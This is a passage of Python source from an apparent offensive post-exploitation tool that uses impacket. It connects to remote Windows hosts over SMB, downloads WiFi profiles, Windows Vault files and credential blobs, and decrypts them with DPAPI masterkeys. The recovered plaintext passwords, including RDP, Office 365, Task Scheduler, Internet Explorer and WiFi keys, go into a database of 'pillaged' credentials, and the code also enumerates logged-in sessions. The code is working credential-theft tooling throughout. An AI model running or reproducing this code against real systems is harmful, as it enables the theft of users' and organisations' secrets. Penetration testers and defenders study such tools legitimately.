							self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting Blob for {localfile} with Masterkey{bcolors.ENDC}")
							self.logging.debug(ex)
		return 1

	def GetWifi(self):
		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Wifi Keys{bcolors.ENDC}")
		blacklist = ['.', '..']
		machine_directories = [("ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces",'*.xml')]

		for info in machine_directories:
			user = self.GetUserByName('MACHINE$')
			my_dir,my_mask=info
			#interface name
			self.logging.debug(f"[{self.options.target_ip}] [+] Looking for interfaces in {my_dir}")#No mask
			my_directory = self.myfileops.do_ls(my_dir,'*', display=False)
			for infos in my_directory:
				longname, is_directory = infos
				if longname not in blacklist and is_directory:
					self.logging.debug(f"[{self.options.target_ip}] [+] Got Wifi interface {longname}")
					tmp_pwd=ntpath.join(my_dir,longname)
					my_directory2 = self.myfileops.do_ls(tmp_pwd,my_mask, display=False)
					for infos2 in my_directory2:
						longname2, is_directory2 = infos2
						if longname2 not in blacklist and not is_directory2:
							self.logging.debug(f"[{self.options.target_ip}] [+] Got wifi config file {longname2}")
							# Downloading Blob file
							localfile = self.myfileops.get_file(ntpath.join(tmp_pwd,longname2))
							user.files[longname2] = {}
							user.files[longname2]['type'] = 'wifi'
							user.files[longname2]['status'] = 'encrypted'
							user.files[longname2]['path'] = localfile


							with open(localfile, 'rb') as f:
								try:
									file_data = f.read().replace(b'\x0a', b'').replace(b'\x0d', b'')
									wifi_name = re.search(b'<name>([^<]+)</name>', file_data)
									wifi_name = wifi_name.group(1)
									user.files[longname2]['wifi_name'] = wifi_name
									key_material_re = re.search(b'<keyMaterial>([0-9A-F]+)</keyMaterial>', file_data)
									if not key_material_re:
										continue
									key_material = key_material_re.group(1)
									#with open("key_material.tmp", "wb") as f:
									#	f.write(binascii.unhexlify(key_material))
								except Exception as ex:
									self.logging.error(f"{bcolors.WARNING}Error in wifi parsing{bcolors.ENDC}")
									self.logging.debug(ex)

								try:
									myoptions = copy.deepcopy(self.options)
									myoptions.file = None#"key_material.tmp"  # BLOB to parse
									myoptions.key = None
									myoptions.masterkeys = None#user.masterkeys_file
									mydpapi = DPAPI(myoptions, self.logging)
									guid = mydpapi.find_Blob_masterkey(raw_data=binascii.unhexlify(key_material))
									self.logging.debug(f"[{self.options.target_ip}] Looking for {longname2} masterkey : {guid}")
									if guid != None:
										masterkey = self.get_masterkey(user=user, guid=guid, type='MACHINE')
										if masterkey != None:
											if masterkey['status'] == 'decrypted':
												mydpapi.options.key = masterkey['key']
												#cred_data = mydpapi.decrypt_credential()
												cred_data = mydpapi.decrypt_blob(raw_data=binascii.unhexlify(key_material))
												if cred_data != None:
													user.files[longname2]['status'] = 'decrypted'
													user.files[longname2]['data'] = cred_data
													user.files[longname2]['secret'] = cred_data
													self.logging.info(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} Wifi {bcolors.OKBLUE}{wifi_name} {bcolors.OKGREEN} - {cred_data}{bcolors.ENDC}")
													############PROCESSING DATA
													self.db.add_credz(credz_type='wifi',
																	  credz_username=wifi_name.decode('utf-8'),
																	  credz_password=cred_data.decode('utf-8'),
																	  credz_target=wifi_name.decode('utf-8'),
																	  credz_path=user.files[longname2]['path'],
																	  pillaged_from_computer_ip=self.options.target_ip,
																	  pillaged_from_username=user.username)
													#semf.process_decrypted_data(user.files[longname2])#cred_data, user, localfile, type='wifi', args=[wifi_name])
											else:
												self.logging.debug(
													f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting WIFI Blob for {localfile} with Masterkey - Masterkey not decrypted{bcolors.ENDC}")
										else:
											self.logging.debug(
												f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting WIFI Blob for {localfile} with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
									else:
										self.logging.debug(
											f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting WIFIBlob for {localfile} with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")
								except Exception as ex:
									self.logging.error(f"{bcolors.WARNING}Exception decrypting wifi credentials{bcolors.ENDC}")
									self.logging.debug(ex)
		return 1

	def GetVNC(self):
		try:
			self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering VNC Passwords{bcolors.ENDC}")
			myvnc = Vnc(self.myregops, self.myfileops, self.logging, self.options, self.db)
			myvnc.vnc_from_filesystem()
			myvnc.vnc_from_registry()
		except Exception as ex:
			self.logging.error(f"{bcolors.WARNING}Exception IN VNC GATHERING{bcolors.ENDC}")
			self.logging.debug(ex)

	def GetVaults(self):
		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Vaults{bcolors.ENDC}")
		blacklist = ['.', '..','UserProfileRoaming']
		#credentials ?
		#Vaults ?
		#Parse chrome
		#autres navigateurs ?
		#CredHistory

		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Vault", '*', 'vault','DOMAIN')]
		machine_directories = [("ProgramData\\Microsoft\\Vault",'*','vault','MACHINE'),
							   ("Windows\\system32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault\\",'*','vault','MACHINE')] #Windows hello pincode

		for user in self.users:
			if user.username == 'MACHINE$':
				directories_to_use = machine_directories
			else:
				directories_to_use = user_directories

			if len(user.masterkeys_file)>0:#Pas de masterkeys==pas de datas a recup
				for info in directories_to_use:
					my_dir, my_mask, my_blob_type, my_user_type = info
					tmp_pwd = my_dir.format(username=user.username) #f"Users\\{user.username}\\{my_dir}"#ntpath.join(ntpath.join('Users', user.username), my_dir)
					self.logging.debug("Looking for %s Vaults in %s with mask %s" % (user.username, tmp_pwd, my_mask))
					my_directory = self.myfileops.do_ls(tmp_pwd, my_mask, display=False)
					for infos in my_directory:
						longname, is_directory = infos
						self.logging.debug("ls returned %s" % longname)
						if longname not in blacklist and is_directory:
							self.logging.debug("Got Vault Directory %s" % longname)
							tmp_pwd2 = ntpath.join(tmp_pwd, longname)
							try:
								# First get the Policy.vpol
								local_vpol_file = self.myfileops.get_file(ntpath.join(tmp_pwd2, "Policy.vpol"))
								user.files[longname] = {}
								user.files[longname]['type'] = my_blob_type
								user.files[longname]['status'] = 'encrypted'
								user.files[longname]['UID'] = longname
								user.files[longname]['path'] = tmp_pwd2
								user.files[longname]['vpol_path'] = local_vpol_file
								user.files[longname]['vpol_status'] = 'encrypted'
								user.files[longname]['vsch'] = {}
								user.files[longname]['vcrd'] = {}
								user.files[longname]['data'] = ''
								# Decrypt the keys

								myoptions = copy.deepcopy(self.options)
								myoptions.vcrd = None  # Vault File to parse
								myoptions.masterkeys = None
								myoptions.vpol = local_vpol_file
								myoptions.key = None
								mydpapi = DPAPI(myoptions,self.logging)
								guid = mydpapi.find_Vault_Masterkey()
								if guid != None:
									masterkey = self.get_masterkey(user=user, guid=guid, type=my_user_type)
									if masterkey != None:
										if masterkey['status'] == 'decrypted':
											mydpapi.options.key = masterkey['key']
											keys = mydpapi.decrypt_vault()
											if keys != None:
												self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Vault Policy file Decryption successfull - {local_vpol_file}{bcolors.ENDC}")
												tmp_vaultkeys = []
												if keys['Key1']['Size'] > 0x24:
													tmp_vaultkeys.append(
														'0x%s' % binascii.hexlify(keys['Key2']['bKeyBlob']))
													tmp_vaultkeys.append(
														'0x%s' % binascii.hexlify(keys['Key1']['bKeyBlob']))
												else:
													tmp_vaultkeys.append(
														'0x%s' % binascii.hexlify(
															keys['Key2']['bKeyBlob']['bKey']).decode('latin-1'))
													tmp_vaultkeys.append(
														'0x%s' % binascii.hexlify(
															keys['Key1']['bKeyBlob']['bKey']).decode('latin-1'))
												self.logging.debug(	f"[{self.options.target_ip}] Saving {len(tmp_vaultkeys)} Vault keys {bcolors.ENDC}")
												user.files[longname]['vpol_status'] = 'decrypted'
												user.files[longname]['status'] = 'decrypted'
												user.files[longname]['data'] = tmp_vaultkeys
											else:
												self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Policy.vpol {local_vpol_file} with Masterkey{bcolors.ENDC}")
												continue
										else:
											self.logging.debug(
												f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Policy.vpol {local_vpol_file} with Masterkey - Masterkey not decrypted{bcolors.ENDC}")
											continue
									else:
										self.logging.debug(
											f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Policy.vpol {local_vpol_file} with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
										continue
								else:
									self.logging.debug(
										f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Policy.vpol {local_vpol_file} with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")
									continue

							except Exception as ex:
								self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting Policy.vpol {local_vpol_file} with Masterkey{bcolors.ENDC}")
								self.logging.debug(ex)
								continue


							#Look for .vsch : Vault Schema file

							#Then gets *.vcrd files
							my_directory2 = self.myfileops.do_ls(tmp_pwd2, my_mask, display=False)
							self.logging.debug(	f"[{self.options.target_ip}] Found {len(my_directory2)} files in {tmp_pwd2}")
							for infos2 in my_directory2:
								longname2, is_directory2 = infos2
								self.logging.debug("ls returned file %s"%longname2)
								if longname2 not in blacklist and not is_directory2 and not longname2=="Policy.vpol":
									try:
										# Downloading Blob file
										localfile = self.myfileops.get_file(ntpath.join(tmp_pwd2,longname2))
										if longname2[-4:]=='vsch': #PAS G2R2 pour le moment
											user.files[longname]['vsch'][localfile]={}
											user.files[longname]['vsch'][localfile]['status'] = 'encrypted'
											user.files[longname]['vsch'][localfile]['type'] = 'vsch'
											user.files[longname]['vsch'][localfile]['vault_name'] = longname2
											user.files[longname]['vsch'][localfile]['path'] = localfile
											continue
										elif longname2[-4:]=='vcrd':
											user.files[longname]['vcrd'][localfile] = {}
											user.files[longname]['vcrd'][localfile]['status'] = 'encrypted'
											user.files[longname]['vcrd'][localfile]['type'] = 'vcrd'
											user.files[longname]['vcrd'][localfile]['vault_name'] = longname2
											user.files[longname]['vcrd'][localfile]['path'] = localfile

										myoptions = copy.deepcopy(self.options)
										myoptions.vcrd = localfile  # Vault File to parse
										myoptions.vaultkeys = tmp_vaultkeys
										myoptions.vpol=None
										myoptions.key = None
										mydpapi = DPAPI(myoptions,self.logging)
										vault_data,data_type = mydpapi.decrypt_vault()
										if vault_data != None:
											user.files[longname]['vcrd'][localfile]['status'] = 'decrypted'
											user.files[longname]['vcrd'][localfile]['data'] = vault_data
											user.files[longname]['vcrd'][localfile]['vault_type'] = data_type
										self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}{user.username} {bcolors.OKGREEN}Vault .vcrd Decryption successfull - {localfile}{bcolors.ENDC}")
										self.process_decrypted_vault(user,user.files[longname]['vcrd'][localfile])#vault_data,user,localfile,my_blob_type,args=[longname2,data_type])

									except Exception as ex:
										self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting vcrd Vault with Masterkey - {longname2} {bcolors.ENDC}")
										self.logging.debug(ex)
		return 1

	def dump_to_file(self,localfile_encrypted,localdata_decrypted):
		self.logging.debug(f"[{self.options.target_ip}] Dumping decrypted {localfile_encrypted} to file{bcolors.ENDC}")
		try:
			localfile_decrypted = os.path.join(os.path.split(localfile_encrypted)[0],os.path.split(localfile_encrypted)[1]+"_decrypted")
			fh = open(localfile_decrypted, 'wb')
			fh.write(f"{localdata_decrypted}".encode('utf-8'))
			fh.close()
			return 1
		except Exception as ex:
			self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception dump_to_file{bcolors.ENDC}")
			self.logging.debug(ex)

	def process_decrypted_data(self, user, secret_file):  # data ,user ,localfile,blob_type,args=[]):
		try:
			self.logging.debug(f"[{self.options.target_ip}] [+] process_decrypted_data of {secret_file} {bcolors.ENDC}")
			blob_type = secret_file['type']
			localfile = secret_file['path']
			data = secret_file['data']
			if blob_type == 'rdg':
				self.logging.debug("IT S A Remote Desktop Cred file")
				clear_data = self.dump_credential_blob(data)
			elif blob_type == 'credential':

				if 'Domain:target=TERMSRV' in data['Target'].decode('utf-16le') or 'LegacyGeneric:target=TERMSRV' in data['Target'].decode('utf-16le'):
					clear_data=self.dump_CREDENTIAL_TSE(user, localfile, data)
				elif 'Domain:target=msteams' in data['Target'].decode('utf-16le') or 'LegacyGeneric:target=msteams' in	data['Target'].decode('utf-16le'):
					self.logging.debug("IT S A MSTeam Credential!")
					clear_data = self.dump_CREDENTIAL_TSE(user, localfile, data)
				elif 'Domain:batch=TaskScheduler' in data['Target'].decode('utf-16le') or 'LegacyGeneric:target=msteams' in data['Target'].decode('utf-16le'):
					self.logging.debug("IT S A TaskScheduler Cred!")
					clear_data = self.dump_CREDENTIAL_TASKSCHEDULER(user, localfile, data)
					'''Domain:batch=TaskScheduler:Task:{31368695-xxxxxxxxxxx}
					Username    : Domain\Administrateur
					Unknown3     : @&&&&&&&
					'''
				elif 'Domain:target=MicrosoftOffice16_Data:orgid' in data['Target'].decode('utf-16le') or 'LegacyGeneric:target=MicrosoftOffice16_Data:orgid' in data['Target'].decode('utf-16le'):
					self.logging.debug("IT S A Office365 Cred!")
					clear_data = self.dump_CREDENTIAL_TSE(user, localfile, data)
					'''
									[CREDENTIAL]
					LastWritten : 2020-02-18 08:48:39
					Flags       : 48 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
					Persist     : 0x3 (CRED_PERSIST_ENTERPRISE)
					Type        : 0x1 (CRED_PERSIST_SESSION)
					Target      : LegacyGeneric:target=MicrosoftOffice15_Data:SSPI:v.xxxxxxx@xxxxxx.com
					Description : 
					Unknown     : 
					Username    : 
					Unknown3     : xxxxxxxxx
					
					
					
					'''
				elif 'WindowsLive:target=virtualapp/didlogical' in data['Target'].decode('utf-16le'):
					self.logging.debug("IT S A Windows Live service or application Cred!")
					clear_data = self.dump_credential_blob(user, localfile, data)
				# ADCONNECT
				elif 'Microsoft_AzureADConnect_KeySet' in data['Target'].decode('utf-16le'):
					self.logging.debug(f"{bcolors.WARNING}IT S A Microsoft_AzureADConnect_KeySet Cred!{bcolors.ENDC}")
					clear_data = self.Get_AD_Connect(user, localfile, data)
				elif 'LegacyGeneric:target=' in data['Target'].decode('utf-16le'):#Autres Targets
					self.logging.debug("Other legacy Credential")
					clear_data = self.dump_credential_blob(user, localfile, data)
				else:
					self.logging.debug("Unknown Cred Target content - testing as Credential BLOB")
					clear_data = self.dump_credential_blob(user, localfile, data)
					#clear_data = ''
				secret_file['secret'] = clear_data
				self.dump_to_file(localfile, clear_data)
				self.logsecret(clear_data)

		# TSE Account
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] {bcolors.WARNING}Except 2 process_decrypted_data ALL for {localfile} {bcolors.ENDC}")
			self.logging.debug(ex)


	def dump_credential_blob(self,user, localfile, decrypted_blob):
		#from impacket.ese import getUnixTime
		try:
			self.logging.debug("Dumping decrypted credential blob info to file")
			#self.logging.debug(decrypted_blob)
			info="\n"
			info+=f"[CREDENTIAL]\n"
			try:
				info+=f"LastWritten : {datetime.utcfromtimestamp(impacket.dpapi.getUnixTime(decrypted_blob['LastWritten']))}\n"
				info+=f"Flags       : {decrypted_blob['Flags']} ({impacket.dpapi.getFlags(impacket.dpapi.CREDENTIAL_FLAGS, decrypted_blob['Flags'])})\n"
				info+=f"Persist     : 0x{decrypted_blob['Persist']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Persist']).name})\n"
				info+=f"Type        : 0x{decrypted_blob['Type']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Type']).name})\n"
				self.logging.debug(info)
			except Exception as ex:
				self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception 1 decrypted_blob.attributes {bcolors.ENDC}")
				self.logging.debug(ex)
			info+=f"Target      : {decrypted_blob['Target'].decode('utf-16le')}\n"
			info+=f"Description : {decrypted_blob['Description'].decode('utf-16le')}\n"
			info+=f"Unknown     : {decrypted_blob['Unknown'].decode('utf-16le')}\n"
			info+=f"Username    : {decrypted_blob['Username'].decode('utf-16le')}\n"
			try:
				info+=f"Unknown3     : {decrypted_blob['Unknown3'].decode('utf-16le')}\n"
				password=f"{decrypted_blob['Unknown3'].decode('utf-16le')}"
			except UnicodeDecodeError:
				info+=f"Unknown3.     : {decrypted_blob['Unknown3'].decode('latin-1')}\n"
				password = f"{decrypted_blob['Unknown3'].decode('latin-1')}"
			#print()
			if "WindowsLive:target=virtualapp" not in f"{decrypted_blob['Target'].decode('utf-16le')}"  :#"WindowsLive:target=virtualapp/didlogical" On ne gere pas pour le moment// A voir pour rassembler le contenu en 1 nouveau blob ?
				for entry in decrypted_blob.attributes:
					try:
						info += f"KeyWord : {entry['KeyWord'].decode('utf-16le')}\n"
						info += f"Flags   : {entry['Flags']}, {impacket.dpapi.getFlags(CREDENTIAL_FLAGS, entry['Flags'])}\n"
						info += f"Data    : {entry['Data']}\n"
					except Exception as ex:
						self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception 2 decrypted_blob.attributes {bcolors.ENDC}")
						self.logging.debug(ex)
						entry.dump()
						continue

			############PROCESSING DATA
			self.db.add_credz(credz_type='credential-blob',
							  credz_username=decrypted_blob['Username'].decode('utf-16le'),
							  credz_password=password,
							  credz_target=decrypted_blob['Target'].decode('utf-16le'),
							  credz_path=localfile,
							  pillaged_from_computer_ip=self.options.target_ip,
							  pillaged_from_username=user.username)

			self.logging.debug(info)
			return info
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception 3 dump_credential_blob {bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_CREDENTIAL_TSE(self, user,localfile,decrypted_blob):
		#from impacket.ese import getUnixTime
		try:
			self.logging.debug("Dumping TSE decrypted credential blob info to file")
			#self.logging.debug(decrypted_blob)
			info="\n"
			info+=f"[CREDENTIAL]\n"
			try:
				info+=f"LastWritten : {datetime.utcfromtimestamp(impacket.dpapi.getUnixTime(decrypted_blob['LastWritten']))}\n"
				info+=f"Flags       : {decrypted_blob['Flags']} ({impacket.dpapi.getFlags(impacket.dpapi.CREDENTIAL_FLAGS, decrypted_blob['Flags'])})\n"
				info+=f"Persist     : 0x{decrypted_blob['Persist']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Persist']).name})\n"
				info+=f"Type        : 0x{decrypted_blob['Type']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Type']).name})\n"
			except Exception as ex:
				self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception 1 decrypted_blob.attributes {bcolors.ENDC}")
				self.logging.debug(ex)
			info+=f"Target      : {decrypted_blob['Target'].decode('utf-16le')}\n"
			info+=f"Description : {decrypted_blob['Description'].decode('utf-16le')}\n"
			info+=f"Unknown     : {decrypted_blob['Unknown'].decode('utf-16le')}\n"
			info+=f"Username    : {decrypted_blob['Username'].decode('utf-16le')}\n"
			try:
				info+=f"Unknown3     : {decrypted_blob['Unknown3'].decode('utf-16le')}\n"
				password=decrypted_blob['Unknown3'].decode('utf-16le')
			except UnicodeDecodeError:
				info+=f"Unknown3.     : {decrypted_blob['Unknown3'].decode('latin-1')}\n"
				password=decrypted_blob['Unknown3'].decode('latin-1')
			############PROCESSING DATA
			self.db.add_credz(credz_type='browser-internet_explorer',
							  credz_username=decrypted_blob['Username'].decode('utf-16le'),
							  credz_password=password,
							  credz_target=decrypted_blob['Target'].decode('utf-16le'),
							  credz_path=localfile,
							  pillaged_from_computer_ip=self.options.target_ip,
							  pillaged_from_username=user.username)
			self.logging.debug(info)
			return info
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception 3 dump_credential_blob {bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_CREDENTIAL_MSOFFICE(self, user,localfile,decrypted_blob):
		#from impacket.ese import getUnixTime
		try:
			self.logging.debug("Dumping Microsoft Office decrypted credential blob info to file")
			#self.logging.debug(decrypted_blob)
			info="\n"
			info+=f"[CREDENTIAL]\n"
			try:
				info+=f"LastWritten : {datetime.utcfromtimestamp(impacket.dpapi.getUnixTime(decrypted_blob['LastWritten']))}\n"
				info+=f"Flags       : {decrypted_blob['Flags']} ({impacket.dpapi.getFlags(impacket.dpapi.CREDENTIAL_FLAGS, decrypted_blob['Flags'])})\n"
				info+=f"Persist     : 0x{decrypted_blob['Persist']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Persist']).name})\n"
				info+=f"Type        : 0x{decrypted_blob['Type']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Type']).name})\n"
			except Exception as ex:
				self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception 1 decrypted_blob.attributes {bcolors.ENDC}")
				self.logging.debug(ex)
			info+=f"Target      : {decrypted_blob['Target'].decode('utf-16le')}\n"
			info+=f"Description : {decrypted_blob['Description'].decode('utf-16le')}\n"
			info+=f"Unknown     : {decrypted_blob['Unknown'].decode('utf-16le')}\n"
			info+=f"Username    : {decrypted_blob['Username'].decode('utf-16le')}\n"
			try:
				info+=f"Unknown3     : {decrypted_blob['Unknown3'].decode('utf-16le')}\n"
				password=decrypted_blob['Unknown3'].decode('utf-16le')
			except UnicodeDecodeError:
				info+=f"Unknown3.     : {decrypted_blob['Unknown3'].decode('latin-1')}\n"
				password=decrypted_blob['Unknown3'].decode('latin-1')


			############PROCESSING DATA
			self.db.add_credz(credz_type='browser-internet_explorer',
							  credz_username=decrypted_blob['Username'].decode('utf-16le'),
							  credz_password=password,
							  credz_target=decrypted_blob['Target'].decode('utf-16le'),
							  credz_path=localfile,
							  pillaged_from_computer_ip=self.options.target_ip,
							  pillaged_from_username=user.username)
			self.logging.debug(info)
			return info
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception 3 dump_credential_blob {bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_CREDENTIAL_TASKSCHEDULER(self, user,localfile,decrypted_blob):
		#from impacket.ese import getUnixTime
		try:
			self.logging.debug("Dumping TASKSCHEDULER decrypted credential blob info to file")
			#self.logging.debug(decrypted_blob)
			info="\n"
			info+=f"[CREDENTIAL]\n"
			try:
				info+=f"LastWritten : {datetime.utcfromtimestamp(impacket.dpapi.getUnixTime(decrypted_blob['LastWritten']))}\n"
				info+=f"Flags       : {decrypted_blob['Flags']} ({impacket.dpapi.getFlags(impacket.dpapi.CREDENTIAL_FLAGS, decrypted_blob['Flags'])})\n"
				info+=f"Persist     : 0x{decrypted_blob['Persist']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Persist']).name})\n"
				info+=f"Type        : 0x{decrypted_blob['Type']} ({impacket.dpapi.CREDENTIAL_PERSIST(decrypted_blob['Type']).name})\n"
			except Exception as ex:
				self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception 1 decrypted_blob.attributes {bcolors.ENDC}")
				self.logging.debug(ex)
			info+=f"Target      : {decrypted_blob['Target'].decode('utf-16le')}\n"
			info+=f"Description : {decrypted_blob['Description'].decode('utf-16le')}\n"
			info+=f"Unknown     : {decrypted_blob['Unknown'].decode('utf-16le')}\n"
			info+=f"Username    : {decrypted_blob['Username'].decode('utf-16le')}\n"
			try:
				info+=f"Unknown3     : {decrypted_blob['Unknown3'].decode('utf-16le')}\n"
				password=decrypted_blob['Unknown3'].decode('utf-16le')
			except UnicodeDecodeError:
				info+=f"Unknown3.     : {decrypted_blob['Unknown3'].decode('latin-1')}\n"
				password=decrypted_blob['Unknown3'].decode('latin-1')
			############PROCESSING DATA
			self.db.add_credz(credz_type='taskscheduler',
							  credz_username=decrypted_blob['Username'].decode('utf-16le'),
							  credz_password=password,
							  credz_target=decrypted_blob['Target'].decode('utf-16le'),
							  credz_path=localfile,
							  pillaged_from_computer_ip=self.options.target_ip,
							  pillaged_from_username=user.username)
			self.logging.debug(info)
			return info
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception 3 dump_credential_blob {bcolors.ENDC}")
			self.logging.debug(ex)

	def process_decrypted_vault(self,user,secret_file):#data ,user ,localfile,blob_type,args=[]):
		try:
			self.logging.debug(f"[{self.options.target_ip}] [+] process_decrypted_vault of {secret_file} {bcolors.ENDC}")
			blob_type = secret_file['type']
			localfile = secret_file['path']
			data = secret_file['data']

			if blob_type=='vault' or blob_type=='vcrd':
				try:
					vault_name = secret_file['vault_name']#args[0]
					vault_type = secret_file['vault_type']#args[1]
					self.logging.debug(f"Processing Vault {vault_name} - type : {vault_type} ")
					print(vault_type)
					if vault_type == 'WinBio Key':
						data = self.dump_VAULT_WIN_BIO_KEY(user,localfile,data)
					elif vault_type == 'NGC Local Account Logon Vault Credential':
						data = self.dump_VAULT_NGC_LOCAL_ACCOOUNT(user,localfile,data)
					elif "NGC" in vault_type :
						data = self.dump_VAULT_NGC_ACCOOUNT(user,localfile,data)
					elif vault_type == 'Internet Explorer':
						data = self.dump_VAULT_INTERNET_EXPLORER(user,localfile,data)
					self.logsecret(f"Vault {vault_name} : {data} ")
					#user.secrets["Vault:%s" % vault_name] = data
					secret_file['secret'] = data
					self.dump_to_file(localfile, data)
				except Exception as ex:
					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Except 1 process_decrypted_data Vault for {localfile} {bcolors.ENDC}")
					self.logging.debug(ex)
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] {bcolors.WARNING}Except 2 process_decrypted_data ALL for {localfile} {bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_VAULT_INTERNET_EXPLORER(self,user,localfile,vault_blob):
		try:
			self.logging.debug("Formating VAULT_INTERNET_EXPLORER info")
			retval = "[Internet Explorer]\n"
			retval += f"Username        : {vault_blob['Username'].decode('utf-16le')} \n"
			retval += f"Resource        : {vault_blob['Resource'].decode('utf-16le')} \n"
			retval += f"Password        : {vault_blob['Password'].decode('utf-16le')} : {hexlify(vault_blob['Password'])} \n"
			############PROCESSING DATA
			self.db.add_credz(credz_type='browser-internet_explorer',
							  credz_username=f"{vault_blob['Username'].decode('utf-16le')}",
							  credz_password=f"{vault_blob['Password'].decode('utf-16le')}",
							  credz_target=f"{vault_blob['Resource'].decode('utf-16le')}",
							  credz_path=localfile,
							  pillaged_from_computer_ip=self.options.target_ip,
							  pillaged_from_username=user.username)
			return retval
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception dump_VAULT_INTERNET_EXPLORER{bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_VAULT_WIN_BIO_KEY(self,user,localfile,vault_blob):
		try:
			self.logging.debug("Dumping VAULT_WIN_BIO_KEY info to file")
			retval ="\n[WINDOWS BIOMETRIC KEY]\n"
			retval +='Sid          : %s\n' % RPC_SID(b'\x05\x00\x00\x00' + vault_blob['Sid']).formatCanonical()
			retval +=f"Friendly Name: {vault_blob['Name'].decode('utf-16le')}\n"
			retval +=f"Biometric Key: 0x{hexlify(vault_blob['BioKey']['bKey']).decode('latin-1')}\n"
			return retval
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception dump_VAULT_WIN_BIO_KEY {bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_VAULT_NGC_LOCAL_ACCOOUNT(self,user,localfile,vault_blob):
		try:
			self.logging.debug("Dumping NGC_LOCAL_ACCOOUNT info to file")
			retval ="\n[NGC LOCAL ACCOOUNT]\n"
			retval +='UnlockKey    : %s\n' % hexlify(vault_blob["UnlockKey"])
			retval +='IV           : %s\n' % hexlify(vault_blob["IV"])
			retval +='CipherText   : %s\n' % hexlify(vault_blob["CipherText"])
			return retval
		except Exception as ex:
			self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception dump_NGC_LOCAL_ACCOOUNT {bcolors.ENDC}")
			self.logging.debug(ex)

	def dump_VAULT_NGC_ACCOOUNT(self,user,localfile,vault_blob):
		try:
			self.logging.debug("Dumping VAULT_NGC_ACCOOUNT info to file")
			retval ="\n[NGC VAULT]\n"
			retval +='Sid          : %s\n' % RPC_SID(b'\x05\x00\x00\x00' + vault_blob['Sid']).formatCanonical()
			retval +='Friendly Name: %s\n' % vault_blob['Name'].decode('utf-16le')
			#A completer ?
			vault_blob['Blob'].dump()

			return retval
		except Exception as ex:
			self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception dump_VAULT_NGC_ACCOOUNT{bcolors.ENDC}")
			self.logging.debug(ex)




	def do_who(self):
		#if self.loggedIn is False:
		#	self.logging.error("Not logged in")
		#	return
		rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\srvsvc',
											  smb_connection=self.smb)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(srvs.MSRPC_UUID_SRVS)
		resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)

		for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
			self.logging.info("host: %15s, user: %5s, active: %5d, idle: %5d" % (
				session['sesi10_cname'][:-1], session['sesi10_username'][:-1], session['sesi10_time'],
				session['sesi10_idle_time']))
			self.db.add_connected_user(username=session['sesi10_username'][:-1], ip=session['sesi10_cname'][:-1])


	def get_users(self):
		self.logging.debug("Listing Users by enumerating directories in $Share\\Users")
		blacklist = ['.', '..', 'desktop.ini']
		shares = self.myfileops.get_shares()
		#Intégrer les users share du premier test
		if 'C$' in shares:  # Most likely
			self.myfileops.do_use('C$')
			#self.myfileops.pwd = 'Users'
			completion=self.myfileops.do_ls('Users','*', display=False)
			for infos in completion:
